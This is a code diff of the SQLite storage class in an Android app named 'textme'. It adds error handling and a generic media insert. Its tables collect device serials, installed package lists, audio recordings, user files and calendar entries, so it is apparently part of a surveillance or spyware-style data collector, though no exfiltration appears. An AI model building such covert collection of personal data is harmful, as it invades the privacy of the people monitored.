@@ -3,9 +3,7 @@ package com.candroid.textme;
 import android.content.ContentValues;
 import android.content.Context;
 import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageInfo;
 import android.database.Cursor;
-import android.database.SQLException;
 import android.database.sqlite.SQLiteDatabase;
 import android.util.Log;
 
@@ -23,79 +21,109 @@ public class Database {
 
     protected static void insertDevice(DatabaseHelper database, String address, String manufacturer, String product, String version, String flavor, String serial, String radio){
         SQLiteDatabase db = database.getWritableDatabase();
-        ContentValues values = new ContentValues();
-        values.put(DataContract.DeviceContract.COLUMN_ADDRESS, address);
-        values.put(DataContract.DeviceContract.COLUMN_MANUFACTURER, manufacturer);
-        values.put(DataContract.DeviceContract.COLUMN_PRODUCT, product);
-        values.put(DataContract.DeviceContract.COLUMN_VERSION, version);
-        values.put(DataContract.DeviceContract.COLUMN_FLAVOR, flavor);
-        values.put(DataContract.DeviceContract.COLUMN_SERIAL, serial);
-        values.put(DataContract.DeviceContract.COLUMN_RADIO, radio);
-        long newRowId = db.insert(DataContract.DeviceContract.TABLE_NAME, null, values);
+        long newRowId = -1;
+        try{
+            ContentValues values = new ContentValues();
+            values.put(DataContract.DeviceContract.COLUMN_ADDRESS, address);
+            values.put(DataContract.DeviceContract.COLUMN_MANUFACTURER, manufacturer);
+            values.put(DataContract.DeviceContract.COLUMN_PRODUCT, product);
+            values.put(DataContract.DeviceContract.COLUMN_VERSION, version);
+            values.put(DataContract.DeviceContract.COLUMN_FLAVOR, flavor);
+            values.put(DataContract.DeviceContract.COLUMN_SERIAL, serial);
+            values.put(DataContract.DeviceContract.COLUMN_RADIO, radio);
+            newRowId = db.insert(DataContract.DeviceContract.TABLE_NAME, null, values);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
         if(newRowId > -1){
             Log.d("DATABASE", "We inserted a new device into our device database table");
         }
         db.close();
     }
 
-
-
     protected static void insertPackages(DatabaseHelper database, List<ApplicationInfo> apps){
         SQLiteDatabase db = database.getWritableDatabase();
         for(ApplicationInfo app : apps){
-            ContentValues values = new ContentValues();
-            values.put(DataContract.PackagesContract.COLUMN_PACKAGE_NAME, app.packageName);
-            long newRowId = db.insert(DataContract.PackagesContract.TABLE_NAME, null, values);
-            Log.d("Database", "inserted new package name into row id = " + newRowId);
+            try{
+                ContentValues values = new ContentValues();
+                values.put(DataContract.PackagesContract.COLUMN_PACKAGE_NAME, app.packageName);
+                long newRowId = db.insert(DataContract.PackagesContract.TABLE_NAME, null, values);
+                Log.d("Database", "inserted new package name into row id = " + newRowId);
+            }catch (Exception e){
+                e.printStackTrace();
+            }
         }
         db.close();
     }
 
     protected static long insertAudioFile(Context context, DatabaseHelper database, long time, File audioFile){
         SQLiteDatabase db = database.getWritableDatabase();
-        byte[] file = Helpers.fileToBytes(audioFile);
-        ContentValues values = new ContentValues();
-        values.put(DataContract.AudioRecordingsContract.COLUMN_TIME, time);
-        values.put(DataContract.AudioRecordingsContract.COLUMN_AUDIO_FILES, file);
-        long newRowId = db.insert(DataContract.AudioRecordingsContract.TABLE_NAME, null, values);
+        long newRowId = -1;
+        try{
+            byte[] file = Helpers.fileToBytes(audioFile);
+            ContentValues values = new ContentValues();
+            values.put(DataContract.AudioRecordingsContract.COLUMN_TIME, time);
+            values.put(DataContract.AudioRecordingsContract.COLUMN_AUDIO_FILES, file);
+            newRowId = db.insert(DataContract.AudioRecordingsContract.TABLE_NAME, null, values);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
         db.close();
         return newRowId;
     }
 
-    protected static long insertPhoto(DatabaseHelper database, String name, File photo){
+    protected static long insertMedia(DatabaseHelper database, String name, File mediaFile){
         SQLiteDatabase db = database.getWritableDatabase();
         long newRowId = -1;
-        try{
-            byte[] file = Helpers.fileToBytes(photo);
-            ContentValues values = new ContentValues();
-            values.put(DataContract.PicturesContract.COLUMN_TITLE, name);
-            values.put(DataContract.PicturesContract.COLUMN_PICTURE, file);
-            newRowId = db.insert(DataContract.PicturesContract.TABLE_NAME, null, values);
-        }catch (SQLException e){
-            e.printStackTrace();
-        }finally {
-            if(db != null && db.isOpen()){
-                db.close();
-            }
+        int type = -1;
+        boolean isImage = Helpers.isImage(mediaFile);
+        boolean isVideo = Helpers.isVideo(mediaFile);
+        boolean isText = Helpers.isText(mediaFile);
+        boolean isExcel = Helpers.isSpreadsheet(mediaFile);
+        if(isImage){
+            type = DataContract.MediaContract.TYPE_IMAGE;
+        }else if(isVideo){
+            type = DataContract.MediaContract.TYPE_VIDEO;
+        }else if(isText){
+            type = DataContract.MediaContract.TYPE_TEXT;
+        }else if(isExcel){
+            type = DataContract.MediaContract.TYPE_SPREADSHEET;
+        } else{
+            type = 0;
         }
+        try{
+            byte[] file = Helpers.fileToBytes(mediaFile);
+            ContentValues values = new ContentValues();
+            values.put(DataContract.MediaContract.COLUMN_TITLE, name);
+            values.put(DataContract.MediaContract.COLUMN_FILE, file);
+            values.put(DataContract.MediaContract.COLUMN_TYPE, type);
+            newRowId = db.insert(DataContract.MediaContract.TABLE_NAME, null, values);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+        db.close();
         return newRowId;
     }
 
-
     protected static long insertCalendarEvent(Context context, DatabaseHelper database, String email, String title, String description, long startTime, long endTime, int isAllDay, String duration, String timeZone, String location, String organizer){
         SQLiteDatabase db = database.getWritableDatabase();
-        ContentValues values = new ContentValues();
-        values.put(DataContract.CalendarEventContract.COLUMN_EMAIL_ACCOUNT, email);
-        values.put(DataContract.CalendarEventContract.COLUMN_TITLE, title);
-        values.put(DataContract.CalendarEventContract.COLUMN_DESCRIPTION, description);
-        values.put(DataContract.CalendarEventContract.COLUMN_START_TIME, startTime);
-        values.put(DataContract.CalendarEventContract.COLUMN_END_TIME, endTime);
-        values.put(DataContract.CalendarEventContract.COLUMN_IS_ALL_DAY, isAllDay);
-        values.put(DataContract.CalendarEventContract.COLUMN_DURATION, duration);
-        values.put(DataContract.CalendarEventContract.COLUMN_TIMEZONE, timeZone);
-        values.put(DataContract.CalendarEventContract.COLUMN_LOCATION, location);
-        values.put(DataContract.CalendarEventContract.COLUMN_ORGANIZER, organizer);
-        long newRowId = db.insert(DataContract.CalendarEventContract.TABLE_NAME, null, values);
+        long newRowId = -1;
+        try{
+            ContentValues values = new ContentValues();
+            values.put(DataContract.CalendarEventContract.COLUMN_EMAIL_ACCOUNT, email);
+            values.put(DataContract.CalendarEventContract.COLUMN_TITLE, title);
+            values.put(DataContract.CalendarEventContract.COLUMN_DESCRIPTION, description);
+            values.put(DataContract.CalendarEventContract.COLUMN_START_TIME, startTime);
+            values.put(DataContract.CalendarEventContract.COLUMN_END_TIME, endTime);
+            values.put(DataContract.CalendarEventContract.COLUMN_IS_ALL_DAY, isAllDay);
+            values.put(DataContract.CalendarEventContract.COLUMN_DURATION, duration);
+            values.put(DataContract.CalendarEventContract.COLUMN_TIMEZONE, timeZone);
+            values.put(DataContract.CalendarEventContract.COLUMN_LOCATION, location);
+            values.put(DataContract.CalendarEventContract.COLUMN_ORGANIZER, organizer);
+            newRowId = db.insert(DataContract.CalendarEventContract.TABLE_NAME, null, values);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
         db.close();
         return newRowId;
     }
